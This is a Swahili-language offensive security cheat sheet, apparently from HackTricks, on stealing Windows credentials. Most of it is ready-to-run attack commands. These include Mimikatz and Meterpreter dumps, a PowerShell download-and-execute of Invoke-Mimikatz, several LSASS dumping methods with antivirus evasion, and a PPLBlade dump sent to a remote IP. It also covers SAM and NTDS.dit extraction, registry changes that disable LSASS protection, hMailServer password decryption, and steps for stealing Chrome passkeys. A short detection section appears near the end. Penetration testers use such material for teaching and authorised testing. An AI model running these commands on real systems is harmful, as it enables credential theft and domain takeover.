# Kuiba Windows Credentials

{{#include ../../banners/hacktricks-training.md}}

## Credentials Mimikatz
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**Pata mambo mengine ambayo Mimikatz inaweza kufanya katika** [**ukurasa huu**](credentials-mimikatz.md)**.**

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**Jifunze kuhusu baadhi ya ulinzi unaowezekana wa credentials hapa.**](credentials-protections.md) **Ulinzi huu unaweza kuzuia Mimikatz kutoa baadhi ya credentials.**

## Credentials with Meterpreter

Tumia [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **ambayo** nimeunda ili **kutafuta passwords na hashes** ndani ya mwathiriwa.
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## Bypassing AV

### Procdump + Mimikatz

Kwa kuwa **Procdump kutoka** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**ni tool halali ya Microsoft**, haitambuliwi na Defender.\
Unaweza kutumia tool hii **kudump process ya lsass**, **kupakua dump** na **kuextract** **credentials locally** kutoka kwenye dump.

Unaweza pia kutumia [SharpDump](https://github.com/GhostPack/SharpDump).
```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
Mchakato huu hufanywa kiotomatiki kwa kutumia [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Kumbuka**: Baadhi ya **AV** zinaweza **kutambua** matumizi ya **procdump.exe to dump lsass.exe** kama **hasidi**, kwa sababu **zinatambua** mfuatano wa maandishi **"procdump.exe" and "lsass.exe"**. Kwa hiyo, ni **stealthier** zaidi kumpa procdump **PID** ya lsass.exe kama **argument** badala ya **jina lsass.exe.**

### Kudump lsass kwa kutumia **comsvcs.dll**

DLL inayoitwa **comsvcs.dll**, inayopatikana katika `C:\Windows\System32`, inawajibika kwa **dumping process memory** pale crash inapotokea. DLL hii ina **function** inayoitwa **`MiniDumpW`**, iliyoundwa kuitwa kwa kutumia `rundll32.exe`.\
Si muhimu kutumia arguments mbili za kwanza, lakini ya tatu imegawanywa katika vipengele vitatu. Process ID itakayodumpiwa huunda kipengele cha kwanza, eneo la dump file huwakilisha cha pili, na kipengele cha tatu lazima kiwe neno **full** pekee. Hakuna chaguo mbadala.\
Baada ya kuchanganua vipengele hivi vitatu, DLL huanza kuunda dump file na kuhamisha memory ya process iliyobainishwa ndani ya file hili.\
Matumizi ya **comsvcs.dll** yanawezekana kwa kudump process ya lsass, hivyo kuondoa hitaji la kuupload na kuexecute procdump. Njia hii imeelezwa kwa kina katika [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).<sup>[[9]](#references)</sup>

Command ifuatayo hutumika kwa execution:
```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
**Unaweza kugeuza mchakato huu kuwa wa kiotomatiki kwa kutumia** [**lssasy**](https://github.com/Hackndo/lsassy)**.**

### **Kudump lsass kwa kutumia Task Manager**

1. Bofya kulia kwenye Task Bar na ubofye Task Manager
2. Bofya More details
3. Tafuta mchakato wa "Local Security Authority Process" kwenye kichupo cha Processes
4. Bofya kulia kwenye mchakato wa "Local Security Authority Process" na ubofye "Create dump file".

### Kudump lsass kwa kutumia procdump

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) ni binary iliyosainiwa na Microsoft ambayo ni sehemu ya suite ya [sysinternals](https://docs.microsoft.com/en-us/sysinternals/).
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## Dumpin lsass with PPLBlade

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) ni Protected Process Dumper Tool inayounga mkono kuficha memory dump na kuihamisha kwenye workstations za mbali bila kuihifadhi kwenye disk.

**Key functionalities**:

1. Kukwepa ulinzi wa PPL
2. Kuficha faili za memory dump ili kukwepa mbinu za Defender za kugundua kulingana na signatures
3. Kupakia memory dump kwa kutumia mbinu za RAW na SMB bila kuihifadhi kwenye disk (fileless dump)
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
## LalsDumper – LSASS dumping unaotegemea SSP bila MiniDumpWriteDump

Ink Dragon husafirisha dumper ya hatua tatu inayoitwa **LalsDumper**, ambayo haiwahi kuita `MiniDumpWriteDump`, hivyo EDR hooks kwenye API hiyo hazijawahi kufanya kazi:<sup>[[3]](#references)</sup>

1. **Stage 1 loader (`lals.exe`)** – hutafuta `fdp.dll` kwa placeholder yenye herufi 32 za `d` zilizoandikwa kwa lowercase, huiandika upya kwa absolute path ya `rtu.txt`, huhifadhi DLL iliyorekebishwa kama `nfdp.dll`, na kuita `AddSecurityPackageA("nfdp","fdp")`. Hii hulazimisha **LSASS** kupakia DLL hasidi kama Security Support Provider (SSP) mpya.
2. **Stage 2 ndani ya LSASS** – LSASS inapopakia `nfdp.dll`, DLL husoma `rtu.txt`, hufanya XOR ya kila byte kwa `0x20`, na kumap blob iliyodekodwa kwenye memory kabla ya kuhamisha execution.
3. **Stage 3 dumper** – payload iliyomap huunda upya logic ya MiniDump kwa kutumia **direct syscalls** zinazotafutwa kutoka kwa majina ya API yaliyohash (`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`). Export maalum inayoitwa `Tom` hufungua `%TEMP%\<pid>.ddt`, hutiririsha dump iliyocompressiwa ya LSASS kwenye file, na kufunga handle ili exfiltration ifanyike baadaye.

Operator notes:

* Weka `lals.exe`, `fdp.dll`, `nfdp.dll`, na `rtu.txt` kwenye directory moja. Stage 1 huandika upya placeholder iliyo-hard-code kwa absolute path ya `rtu.txt`, hivyo kuzigawanya huvunja chain.
* Registration hufanyika kwa kuongeza `nfdp` kwenye `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`. Unaweza kuweka value hiyo mwenyewe ili kufanya LSASS ipakie tena SSP kila boot.
* Files za `%TEMP%\*.ddt` ni dumps zilizocompressiwa. Zidecompress locally, kisha uzitumie kwa Mimikatz/Volatility kwa credential extraction.
* Kuendesha `lals.exe` kunahitaji admin/SeTcb rights ili `AddSecurityPackageA` ifanikiwe; call inapomalizika, LSASS hupakia SSP rogue kwa uwazi na kutekeleza Stage 2.
* Kuondoa DLL kwenye disk hakuiondoi kutoka LSASS. Aidha futa registry entry na uanze upya LSASS (reboot), au iache kwa persistence ya muda mrefu.

## CrackMapExec

### Dump SAM hashes
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### Dump LSA secrets
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### Dump NTDS.dit kutoka kwa DC lengwa
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### Dump historia ya password ya NTDS.dit kutoka target DC
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### Onyesha attribute ya pwdLastSet kwa kila akaunti ya NTDS.dit
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## Kuiba SAM & SYSTEM

Faili hizi zinapaswa **kupatikana** katika _C:\windows\system32\config\SAM_ na _C:\windows\system32\config\SYSTEM._ Lakini **huwezi kuzinakili tu kwa njia ya kawaida** kwa sababu zinalindwa.

### Kutoka kwenye Registry

Njia rahisi zaidi ya kuiba faili hizo ni kupata nakala kutoka kwenye Registry:
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
**Pakua** faili hizo kwenye mashine yako ya Kali na **toa hashes** ukitumia:
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### Volume Shadow Copy

Unaweza kunakili mafaili yaliyolindwa ukitumia service hii. Unahitaji kuwa Administrator.

#### Using vssadmin

binary ya vssadmin inapatikana tu katika matoleo ya Windows Server
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
Lakini unaweza kufanya hivyo hivyo kutoka **Powershell**. Huu ni mfano wa **jinsi ya kunakili faili ya SAM** (kiendeshi kinachotumika ni "C:" na imehifadhiwa kwenye C:\users\Public), lakini unaweza kutumia hii kunakili faili yoyote iliyolindwa:
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\system" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\ntds\ntds.dit" C:\Users\Public
$volume.Delete();if($notrunning -eq 1){$service.Stop()}
```
Code kutoka kwenye kitabu: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)<sup>[[7]](#references)</sup>

### Invoke-NinjaCopy

Hatimaye, unaweza pia kutumia [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) kutengeneza nakala ya SAM, SYSTEM na ntds.dit.
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Vitambulisho vya Active Directory - NTDS.dit**

Faili ya **NTDS.dit** inajulikana kama kiini cha **Active Directory**, ikiwa na data muhimu kuhusu objects za watumiaji, groups, na memberships zao. Hapa ndipo **password hashes** za watumiaji wa domain zinahifadhiwa. Faili hii ni database ya **Extensible Storage Engine (ESE)** na inapatikana katika **_%SystemRoom%/NTDS/ntds.dit_**.

Ndani ya database hii, tables tatu kuu zinatunzwa:

- **Data Table**: Table hii ina jukumu la kuhifadhi maelezo kuhusu objects kama watumiaji na groups.
- **Link Table**: Hufuatilia mahusiano, kama vile memberships za groups.
- **SD Table**: **Security descriptors** za kila object huhifadhiwa hapa, kuhakikisha usalama na udhibiti wa access kwa objects zilizohifadhiwa.

Utafiti wa Christoffer Andersson kuhusu database layer unaandika tables hizi na tabia zake kulingana na version kwa maelezo zaidi.<sup>[[8]](#references)</sup>

Windows hutumia _Ntdsa.dll_ kuwasiliana na faili hiyo, na hutumiwa na _lsass.exe_. Kwa hiyo, **sehemu** ya faili ya **NTDS.dit** inaweza kupatikana **ndani ya** memory ya `lsass` (unaweza kupata data iliyofikiwa hivi karibuni, huenda kwa sababu ya kuboreshwa kwa performance kwa kutumia **cache**).

#### Kudecrypt hashes zilizo ndani ya NTDS.dit

Hash ime-encryptiwa mara tatu:

1. Decrypt Password Encryption Key (**PEK**) kwa kutumia **BOOTKEY** na **RC4**.
2. Decrypt **hash** kwa kutumia **PEK** na **RC4**.
3. Decrypt **hash** kwa kutumia **DES**.

**PEK** ina **thamani ileile kwenye kila domain controller**, lakini ime-encryptiwa ndani ya **NTDS.dit** kwa kutumia **BOOTKEY** maalum ya DC kutoka kwenye hive ya **SYSTEM** ya domain controller huyo. Kwa hiyo, kutoa credentials kunahitaji **NTDS.dit** na **SYSTEM** (`C:\Windows\System32\config\SYSTEM`).

### Kunakili NTDS.dit kwa kutumia Ntdsutil

Inapatikana tangu Windows Server 2008.
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
Unaweza pia kutumia ujanja wa [**volume shadow copy**](#stealing-sam-and-system) kunakili faili ya **ntds.dit**. Kumbuka kwamba utahitaji pia nakala ya **SYSTEM file** (tena, [**idump kutoka kwenye registry au utumie volume shadow copy**](#stealing-sam-and-system)).

### **Kutoa hashes kutoka NTDS.dit**

Baada ya **kupata** faili za **NTDS.dit** na **SYSTEM**, unaweza kutumia tools kama _secretsdump.py_ ili **kutoa hashes**:
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
Unaweza pia **kuzitoa kiotomatiki** kwa kutumia mtumiaji halali wa domain admin:
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
Kwa **faili kubwa za NTDS.dit**, inapendekezwa kuitoa kwa kutumia [gosecretsdump](https://github.com/c-sto/gosecretsdump).

Hatimaye, unaweza pia kutumia **metasploit module**: _post/windows/gather/credentials/domain_hashdump_ au **mimikatz** `lsadump::lsa /inject`

### **Kutoa objects za domain kutoka NTDS.dit hadi kwenye database ya SQLite**

NTDS objects zinaweza kutolewa hadi kwenye database ya SQLite kwa kutumia [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). Sio secrets pekee zinazotolewa, bali pia objects zote pamoja na attributes zake kwa ajili ya kutoa maelezo zaidi wakati faili ghafi ya NTDS.dit tayari imepatikana.
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
Hive ya `SYSTEM` ni ya hiari, lakini inaruhusu usimbuaji wa secrets (NT & LM hashes, supplemental credentials kama vile cleartext passwords, kerberos au trust keys, NT & LM password histories). Pamoja na taarifa nyingine, data ifuatayo hutolewa: user na machine accounts pamoja na hashes zao, UAC flags, timestamp ya last logon na password change, maelezo ya accounts, majina, UPN, SPN, groups na recursive memberships, organizational units tree na membership, trusted domains pamoja na trusts type, direction na attributes...

## Lazagne

Download binary kutoka [hapa](https://github.com/AlessandroZ/LaZagne/releases). Unaweza kutumia binary hii kutoa credentials kutoka kwenye software kadhaa.
```
lazagne.exe all
```
## Zana nyingine za kutoa credentials kutoka SAM na LSASS

### Windows credentials Editor (WCE)

Zana hii inaweza kutumika kutoa credentials kutoka kwenye kumbukumbu. Ipakue kutoka: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

Toa credentials kutoka kwenye faili ya SAM
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

Extract credentials kutoka kwenye faili la SAM
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

Pakua kutoka:[ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) kisha **i-execute** na passwords zitatolewa.

## Kuchimba RDP sessions zisizotumika na kudhoofisha security controls

FinalDraft RAT ya Ink Dragon inajumuisha tasker ya `DumpRDPHistory` ambayo techniques zake zinafaa kwa red-teamer yeyote:<sup>[[3]](#references)</sup>

### Ukusanyaji wa telemetry wa mtindo wa DumpRDPHistory

* **Outbound RDP targets** – parse kila user hive kwenye `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*`. Kila subkey huhifadhi jina la server, `UsernameHint`, na timestamp ya mwisho ya kuandikwa. Unaweza kuiga logic ya FinalDraft kwa kutumia PowerShell:

```powershell
Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
ForEach-Object {
$server = Split-Path $_.Name -Leaf
$user = (Get-ItemProperty $_.Name).UsernameHint
"OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
}
}
```

* **Ushahidi wa inbound RDP** – query log ya `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` kwa Event IDs **21** (successful logon) na **25** (disconnect) ili kubaini ni nani aliyekuwa akiadministrate box:

```powershell
Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
| Where-Object { $_.Id -in 21,25 } \
| Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
```

Baada ya kujua ni Domain Admin yupi anaye-connect mara kwa mara, dump LSASS (kwa LalsDumper/Mimikatz) wakati session yao **iliyokatishwa muunganisho** bado ipo. CredSSP + NTLM fallback huacha verifier na tokens zao ndani ya LSASS, ambazo zinaweza kisha kureplayed kupitia SMB/WinRM ili kuchukua `NTDS.dit` au kuweka persistence kwenye domain controllers.

### Registry downgrades zinazolengwa na FinalDraft

Implant hiyo hiyo pia hubadilisha registry keys kadhaa ili kurahisisha credential theft:<sup>[[3]](#references)</sup>
```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```
* Kuweka `DisableRestrictedAdmin=1` hulazimisha full credential/ticket reuse wakati wa RDP, na kuwezesha pass-the-hash style pivots.
* `LocalAccountTokenFilterPolicy=1` huzima uchujaji wa tokeni za UAC ili local admins wapate tokeni zisizo na vizuizi kupitia mtandao.
* `DSRMAdminLogonBehavior=2` humruhusu msimamizi wa DSRM kuingia wakati DC iko online, na kuwapa attackers akaunti nyingine ya built-in yenye high privilege.
* `RunAsPPL=0` huondoa ulinzi wa LSASS PPL, na kufanya ufikiaji wa memory kuwa rahisi kwa dumpers kama LalsDumper.

## hMailServer database credentials (post-compromise)

hMailServer huhifadhi DB password yake katika `C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini` chini ya `[Database] Password=`. Thamani hiyo imesimbwa kwa Blowfish kwa kutumia static key `THIS_KEY_IS_NOT_SECRET` na 4-byte word endianness swaps. Tumia hex string kutoka kwenye INI pamoja na Python snippet hii:<sup>[[2]](#references)</sup>
```python
from Crypto.Cipher import Blowfish
import binascii

def swap4(data):
return b"".join(data[i:i+4][::-1] for i in range(0, len(data), 4))
enc_hex = "HEX_FROM_HMAILSERVER_INI"
enc = binascii.unhexlify(enc_hex)
key = b"THIS_KEY_IS_NOT_SECRET"
plain = swap4(Blowfish.new(key, Blowfish.MODE_ECB).decrypt(swap4(enc))).rstrip(b"\x00")
print(plain.decode())
```
Kwa kutumia nywila ya maandishi wazi, nakili database ya SQL CE ili kuepuka kufungwa kwa faili, pakia 32-bit provider, na uboreshe ikihitajika kabla ya kuuliza hashes:
```powershell
Copy-Item "C:\Program Files (x86)\hMailServer\Database\hMailServer.sdf" C:\Windows\Temp\
Add-Type -Path "C:\Program Files (x86)\Microsoft SQL Server Compact Edition\v4.0\Desktop\System.Data.SqlServerCe.dll"
$engine = New-Object System.Data.SqlServerCe.SqlCeEngine("Data Source=C:\Windows\Temp\hMailServer.sdf;Password=[DBPASS]")
$engine.Upgrade("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf")
$conn = New-Object System.Data.SqlServerCe.SqlCeConnection("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf;Password=[DBPASS]"); $conn.Open()
$cmd = $conn.CreateCommand(); $cmd.CommandText = "SELECT accountaddress,accountpassword FROM hm_accounts"; $cmd.ExecuteReader()
```
Safu wima ya `accountpassword` hutumia muundo wa hash wa hMailServer (hashcat mode `1421`). Kuvunja thamani hizi kunaweza kutoa credentials zinazoweza kutumika tena kwa WinRM/SSH pivots.

## LSA Logon Callback Interception (LsaApLogonUserEx2)

Baadhi ya tooling hunasa **plaintext logon passwords** kwa ku-intercept LSA logon callback `LsaApLogonUserEx2`. Wazo ni kuweka hook au ku-wrap authentication package callback ili credentials zinaswe **wakati wa logon** (kabla ya hashing), kisha ziandikwe kwenye disk au zirudishwe kwa operator. Hili kwa kawaida hutekelezwa kama helper inayojidunga ndani ya LSA au kujisajili nayo, kisha kurekodi kila tukio la interactive/network logon lililofanikiwa pamoja na username, domain na password.<sup>[[1]](#references)</sup>

Maelezo ya kiutendaji:
- Inahitaji local admin/SYSTEM ili kupakia helper kwenye authentication path.
- Credentials zilizonaswa huonekana tu logon inapotokea (interactive, RDP, service, au network logon kulingana na hook).

## SSMS Saved Connection Credentials (sqlstudio.bin)

SQL Server Management Studio (SSMS) huhifadhi taarifa za saved connection kwenye faili ya `sqlstudio.bin` ya kila mtumiaji. Dumpers maalum zinaweza kuchanganua faili hiyo na kurejesha saved SQL credentials. Katika shells zinazorudisha command output pekee, faili mara nyingi hutolewa kwa kuisimba kama Base64 na kuichapisha kwenye stdout.<sup>[[1]](#references)</sup>
```cmd
certutil -encode sqlstudio.bin sqlstudio.b64
type sqlstudio.b64
```
Kwa upande wa operator, jenga upya faili na endesha dumper ndani ya mfumo wa eneo lako ili kurejesha credentials:
```bash
base64 -d sqlstudio.b64 > sqlstudio.bin
```
## Wizi wa passkeys / WebAuthn credentials kutoka Chrome kwenye Windows

Ikiwa code execution itapatikana kama **mtumiaji mwathiriwa** kwenye Windows host inayotumia **Chrome + Google Password Manager synced passkeys**, passkeys huwa shabaha ya kuvutia ya post-exploitation hata **bila admin/SYSTEM**.<sup>[[4]](#references)</sup>

### Mabaki ya ndani yanayovutia
```text
%LocalAppData%\Google\Chrome\User Data\<Profile>\Sync Data\LevelDB
%LocalAppData%\Google\Chrome\User Data\<Profile>\passkey_enclave_state
```
- **`Sync Data\LevelDB`** huhifadhi rekodi za **`WebauthnCredentialSpecifics`** zilizowekwa katika muundo wa protobuf. Process ya mtumiaji huyo huyo inaweza kuorodhesha **RP ID**, **username**, **credential ID**, na nyenzo za private-key zilizosimbwa kwa njia fiche za passkeys zilizosawazishwa.<sup>[[5]](#references)</sup>
- **`passkey_enclave_state`** huhifadhi hali ya enrollment ya kifaa cha ndani, kama vile **`wrapped_identity_private_key`** na secret iliyofungwa inayotumika kurejesha credentials zilizosawazishwa.<sup>[[4]](#references)</sup>

Tathmini ya haraka:
```powershell
Get-ChildItem "$env:LOCALAPPDATA\Google\Chrome\User Data" -Recurse -Force |
Where-Object { $_.FullName -match 'passkey_enclave_state|Sync Data\\LevelDB' } |
Select-Object FullName, Length, LastWriteTime
```
### TPM-bound key blobs bado zinaweza kutumiwa vibaya kama local signing oracle

Ikiwa browser itatoa identity key inayoungwa mkono na TPM kama **`NCRYPT_OPAQUE_KEY_BLOB`** na kuhifadhi blob hiyo katika hali inayoweza kufikiwa na mtumiaji, malware **haihitaji** kutoa raw private key. Inaweza tu ku-import tena blob hiyo kwenye **mashine hiyo hiyo** na kuiomba TPM ya ndani isaini data inayodhibitiwa na mshambulizi:<sup>[[4]](#references)[[6]](#references)</sup>
```c
NCryptOpenStorageProvider(...)
NCryptImportKey(..., NCRYPT_OPAQUE_KEY_BLOB, ...)
NCryptSignHash(...)
```
Hii inamaanisha kuwa **hardware binding huzuia export ya off-device lakini haizuii matumizi ya same-user kwenye endpoint iliyoathiriwa**.

### Njia za vitendo za abuse

1. **Pass-ta-key / device-identity relay**<sup>[[4]](#references)</sup>
- Enumerate `WebauthnCredentialSpecifics` kutoka Chrome's LevelDB.
- Anzisha login ya passkey na upate WebAuthn challenge mpya.
- Tumia blob ya `wrapped_identity_private_key` iliyoibiwa kwenye TPM ya victim ili kusaini binding ya ombi la cloud-authenticator.
- Relay assertion iliyorejeshwa kwa relying party.
- Hii ni muhimu hasa wakati RP inakubali `userVerification=preferred` au inashindwa kukataa assertions zenye **`UV=0`**.
2. **Pending UV-key hijack**<sup>[[4]](#references)</sup>
- Lisha re-onboarding kwa kufuta `passkey_enclave_state` au kwa kutuma operation halali iliyosainiwa ya `device/forget`.
- Ikiwa onboarding inaacha kifaa katika hali ya **`uv_key_pending`**, register UV public key inayodhibitiwa na attacker.
- Ikiwa provider haithibitishi attestation / secure-hardware origin ya UV key mpya, signatures za baadaye kutoka kwenye attacker key zinachukuliwa kuwa **`UV=1`**.
3. **Master-secret / SDS recovery theft**<sup>[[4]](#references)</sup>
- Lisha recovery au rejoin ili Chrome ipakue synced-passkey master secret.
- Fuatilia uundaji upya/urekebishaji wa `passkey_enclave_state`, kisha dump Chrome memory wakati **security domain secret (SDS)** ikiwa katika plaintext resident.
- Tumia SDS iliyopatikana kufuta encryption ya fields zilizofichwa katika kila record ya `WebauthnCredentialSpecifics` na kurejesha portable WebAuthn private keys.

### Mawazo ya DFIR / detection

- Fuatilia **ufutaji/uundaji upya** wa `passkey_enclave_state`.<sup>[[4]](#references)</sup>
- Toa alert kuhusu access isiyo ya kawaida ya Chrome **`Sync Data\LevelDB`** na processes zisizo za browser.
- Toa alert kuhusu **Chrome memory dumps** au cross-process memory access yenye mashaka.
- Chunguza prompts zinazorudiwa za **Google Password Manager recovery PIN** au re-onboarding isiyotarajiwa.
- Kumbuka kuwa WebAuthn **`signCount`** mara nyingi haina manufaa kwa synced passkeys kwa sababu inaweza kubaki constant, hivyo clone detection ya kawaida huwa dhaifu.

## References

- [1] [Unit 42 – Uchunguzi kuhusu Operesheni za Miaka Kadhaa Zisizogunduliwa Zilizolenga Sekta zenye Thamani Kubwa](https://unit42.paloaltonetworks.com/cl-unk-1068-targets-critical-sectors/)
- [2] [0xdf – HTB/VulnLab JobTwo: Word VBA macro phishing kupitia SMTP → usimbuaji wa credential za hMailServer → Veeam CVE-2023-27532 hadi SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [3] [Check Point Research – Ndani ya Ink Dragon: Kufichua Relay Network na Utendaji wa Ndani wa Operesheni ya Kisteli ya Offensive](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [4] [Unit 42 – Pass the Passkey: Attack Surface Mpya katika Passwordless Authentication](https://unit42.paloaltonetworks.com/passwordless-authentication-security-risks/)
- [5] [Chromium – `webauthn_credential_specifics.proto`](https://chromium.googlesource.com/chromium/src/+/main/components/sync/protocol/webauthn_credential_specifics.proto)
- [6] [Microsoft – `NCryptCreatePersistedKey` / CNG key storage](https://learn.microsoft.com/en-us/windows/win32/api/ncrypt/nf-ncrypt-ncryptcreatepersistedkey)
- [7] [0xWord – Hacking Windows: Mashambulizi dhidi ya Mifumo na Mitandao ya Microsoft](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)
- [8] [Jinsi Data Store ya Active Directory Inavyofanya Kazi: Ndani ya NTDS.dit (Sehemu ya 1)](https://blog.chrisse.se/?p=762)
- [9] [en.hackndo.com - Dump ya Remote Lsass Passwords](https://en.hackndo.com/remote-lsass-dump-passwords)
{{#include ../../banners/hacktricks-training.md}}
